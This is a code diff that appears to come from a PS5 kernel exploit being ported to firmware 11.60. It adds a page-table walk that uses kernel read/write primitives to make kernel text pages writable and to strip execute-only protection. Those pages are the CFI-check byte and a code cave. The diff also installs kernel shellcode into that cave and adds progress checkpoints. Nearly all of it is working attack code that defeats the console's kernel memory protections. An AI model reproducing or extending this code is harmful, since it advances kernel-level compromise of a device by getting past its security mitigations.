@@ -19,6 +19,47 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
+#if FW_1160_PORT
+static void checkpoint_1160_resume(const char *stage) {
+  if (fw != PS5_FW_1160)
+    return;
+  printf("11.60 checkpoint: prepare_resume: %s\n", stage);
+  fflush(stdout);
+}
+
+static int page_chain_set_rw_checked_1160(uint64_t va) {
+  uint64_t table_phys = cr3;
+
+  for (int level = 0; level < 4; level++) {
+    int shift = 39 - level * 9;
+    uint64_t index = (va >> shift) & 0x1ff;
+    uint64_t entry_va = dmap + PAGE_PA(table_phys) + index * 8;
+    uint64_t entry = 0;
+
+    if (kernel_copyout(entry_va, &entry, sizeof(entry)) != 0 ||
+        !PAGE_P(entry))
+      return -1;
+
+    uint64_t updated = entry;
+    PAGE_SET_RW(updated);
+    PAGE_CLEAR_XO(updated);
+    if (updated != entry) {
+      uint64_t observed = 0;
+      if (kernel_copyin(&updated, entry_va, sizeof(updated)) != 0 ||
+          kernel_copyout(entry_va, &observed, sizeof(observed)) != 0 ||
+          observed != updated)
+        return -1;
+      entry = updated;
+    }
+
+    if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
+      return 0;
+    table_phys = PAGE_PA(entry);
+  }
+  return -1;
+}
+#endif
+
 #if STAGE2A_1160
 static void stage2a_rollback_or_hold(page_install_transaction *transaction) {
   if (rollback_page_syscore(transaction) == 0)
@@ -95,6 +136,38 @@ static int prepare_resume_1160_stage2a(void **shellcode_kernel,
 #endif
 
 int remove_xotext(void) {
+#if FW_1160_PORT
+  if (fw == PS5_FW_1160) {
+    /*
+     * The broad all-.text walk was the last operation observed before an
+     * earlier 11.60 crash.  The hardware-tested 11.60 path only opens the two
+     * mappings that this Sonic-style handoff must write: the CFI handler byte
+     * patched by the wake shellcode and the executable cave populated by the
+     * resume ROP.  Executing the remaining XOM text does not require making it
+     * readable or writable.
+     */
+    if (env_offset.KERNEL_CFI_CHECK == 0 ||
+        env_offset.KERNEL_CODE_CAVE == 0 || shellcode_kernel_bin_len == 0)
+      return -1;
+
+    if (page_chain_set_rw_checked_1160(ktext +
+                                       env_offset.KERNEL_CFI_CHECK))
+      return -1;
+    for (size_t offset = 0; offset < shellcode_kernel_bin_len;
+         offset += 0x1000) {
+      if (page_chain_set_rw_checked_1160(
+              ktext + env_offset.KERNEL_CODE_CAVE + offset))
+        return -1;
+    }
+
+    printf("11.60 checkpoint: prepare_resume: selective CFI/wake-cave text "
+           "permissions complete (%u wake bytes)\n",
+           shellcode_kernel_bin_len);
+    fflush(stdout);
+    return 0;
+  }
+#endif
+
   uint64_t start = ktext;
   uint64_t end = kdata;
   int n __attribute__((unused)) = 0;
@@ -164,8 +237,14 @@ int prepare_resume(void **shellcode_kernel, size_t *shellcode_kernel_len) {
   uint64_t args_va = prepare_sck_args();
   if (args_va == 0)
     return -1;
+#if FW_1160_PORT
+  checkpoint_1160_resume("argument page prepared and read back");
+#endif
 
   // Copy shellcode_kernel.
+#if FW_1160_PORT
+  checkpoint_1160_resume("wake user mapping begin");
+#endif
   *shellcode_kernel =
       mmap(NULL, ALIGN_UP(shellcode_kernel_bin_len, PAGE_SIZE),
            PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -173,26 +252,45 @@ int prepare_resume(void **shellcode_kernel, size_t *shellcode_kernel_len) {
     return -1;
   *shellcode_kernel_len = shellcode_kernel_bin_len;
   memcpy(*shellcode_kernel, shellcode_kernel_bin, shellcode_kernel_bin_len);
+#if FW_1160_PORT
+  checkpoint_1160_resume("wake user mapping populated");
+#endif
 
   if (update_sck_args_ptr((uint64_t)*shellcode_kernel,
                           shellcode_kernel_bin_len, args_va))
     return -1;
 
   // Install shellcode_kernel in kernel space.
+#if FW_1160_PORT
+  checkpoint_1160_resume("wake alias install begin");
+#endif
   for (size_t i = 0; i < shellcode_kernel_bin_len; i += PAGE_SIZE) {
     install_page_syscore(kernel_cave_shellcode + i,
                          vtophys_user((uintptr_t)*shellcode_kernel + i), 0);
   }
+#if FW_1160_PORT
+  checkpoint_1160_resume("wake alias install complete");
+#endif
 
+#if FW_1160_PORT
+  checkpoint_1160_resume("remove_xotext begin");
+#endif
   if (remove_xotext()) {
     printf("Error: could not remove xo from text\n");
     return -1;
   }
+#if FW_1160_PORT
+  checkpoint_1160_resume("remove_xotext complete");
+  checkpoint_1160_resume("pmap invalidation begin");
+#endif
 
   if (kernel_pmap_invalidate_all()) {
     printf("Error: could not invalidate pmap\n");
     return -1;
   }
+#if FW_1160_PORT
+  checkpoint_1160_resume("pmap invalidation complete");
+#endif
 
   return 0;
 #endif
@@ -258,18 +356,27 @@ uint64_t prepare_sck_args(void) {
     notify("11.60 wake arguments failed preflight; no state was changed\n");
     return 0;
   }
+#if FW_1160_PORT
+  checkpoint_1160_resume("argument preflight passed");
+#endif
 
   uint64_t args_cave = pa_to_dmap(alloc_page());
   kernel_copyin(&args, args_cave, sizeof(args));
 
   if (fw == PS5_FW_1160) {
     shellcode_kernel_args readback = {0};
+#if FW_1160_PORT
+    checkpoint_1160_resume("argument readback begin");
+#endif
     kernel_copyout(args_cave, &readback, sizeof(readback));
     if (memcmp(&args, &readback, sizeof(args)) != 0 ||
         validate_shellcode_kernel_args_1160(&readback) != 0) {
       notify("11.60 wake arguments failed exact readback\n");
       return 0;
     }
+#if FW_1160_PORT
+    checkpoint_1160_resume("argument readback passed");
+#endif
   }
 
   return args_cave;
